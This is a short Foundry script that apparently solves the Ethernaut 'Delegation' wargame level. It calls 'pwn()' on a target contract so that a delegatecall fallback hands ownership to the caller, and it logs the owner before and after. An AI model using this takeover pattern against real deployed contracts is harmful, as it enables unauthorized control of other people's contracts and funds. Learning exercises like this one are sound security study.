// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Delegation.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract DelegationSolution is Script {

    Delegation public delegationInstance = Delegation(0x01e9Bff91A71975F4514f3e3bd92b27d90e39847);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("Owner before: ", delegationInstance.owner());
        address(delegationInstance).call(abi.encodeWithSignature("pwn()")); // call the pwn function of the Delegate contract with the signature "pwn()"
        console.log("Owner after: ", delegationInstance.owner());
        console.log("My Address: ", vm.envAddress("MY_ADDRESS"));
        vm.stopBroadcast();
    }
}